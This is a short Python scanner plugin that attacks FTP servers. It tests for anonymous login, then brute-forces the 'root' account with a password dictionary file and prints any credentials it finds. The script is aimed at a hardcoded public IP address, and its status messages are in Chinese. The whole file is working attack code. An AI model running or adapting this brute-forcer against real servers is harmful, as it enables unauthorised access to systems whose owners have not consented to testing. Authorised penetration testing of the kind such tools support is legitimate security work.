#!/usr/bin/python
# __author__ = 'jasonsheh'
# -*- coding:utf-8 -*-
from lib.poc.Base import POC
import ftplib

import sys
from setting import user_path
sys.path.append(user_path)


class FtpBrute(POC):
    def __init__(self, target):
        self.target = target

    def direct_connect(self):
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, 21)
            ftp.login()
            ftp.retrlines('LIST')
            ftp.quit()
            print('存在ftp匿名访问漏洞')
        except:
            pass

    def weak_password(self):
        with open('./dict/pwd50.txt') as file:
            for password in file:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(self.target, 21, timeout=8)
                    ftp.login(user='root', passwd=password)
                    print('ftp 密码为: ', password)
                except:
                    pass

    def run(self):
        self.direct_connect()
        self.weak_password()


if __name__ == '__main__':
    FtpBrute(target='115.159.160.21').run()
